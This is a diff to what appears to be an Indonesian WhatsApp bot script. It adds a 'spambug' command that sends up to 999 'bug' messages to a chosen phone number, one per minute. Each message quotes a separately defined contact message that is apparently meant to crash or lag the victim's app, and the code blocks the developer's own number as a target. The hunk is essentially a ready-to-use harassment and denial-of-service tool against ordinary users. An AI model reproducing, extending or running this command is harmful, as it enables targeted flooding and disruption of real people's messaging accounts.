@@ -165,6 +165,26 @@ semar.sendMessage(`${dn}@s.whatsapp.net`, { text: "‎" }, { quoted: contactMess
 reply(`Sukses mengirim bug ke nomor ${dn}`)
 break
 
+//©from: dennis × ivan × andik
+case 'spambug':
+if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
+if (!dn) return reply(`Silahkan masukkan nomor dan jumlah bug!\nContoh: ${prefix}spambug ${senderNumber}|10`)
+if (args[0].startsWith('0')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}spambug ${senderNumber}|10`)
+if (args[0].startsWith('+')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}spambug ${senderNumber}|10`)
+if (args[0].startsWith(`${nomorDeveloper}`)) return reply('Tidak bisa mengirim bug ke nomor developer!')
+if (args[0].startsWith(`${botNumber}`)) return reply('Tidak bisa mengirim bug ke nomor ini!')
+nd = dn.split("|")
+if (Number(nd[1]) >= 1000) return reply('Jumlah terlalu banyak!')
+if (!Number(nd[1])) return reply(`Silahkan masukkan jumlah bug!\nContoh: ${prefix}spambug ${senderNumber}|10`)
+reply('Loading...')
+for (let i = 0; i < nd[1]; i++){
+await sleep(60000)
+reply(`Berhasil mengirim ${Number(i) + 1} bug!`)
+semar.sendMessage(`${dn}@s.whatsapp.net`, { text: "‎" }, { quoted: contactMessage })
+semar.sendMessage(`${nd[0]}@s.whatsapp.net`, { text: "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61" })}
+reply(`Sukses spam ${nd[1]} bug ke nomor ${nd[0]}`)
+break
+
 //©from: dennis x haikal
 case 'buggc':
 if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
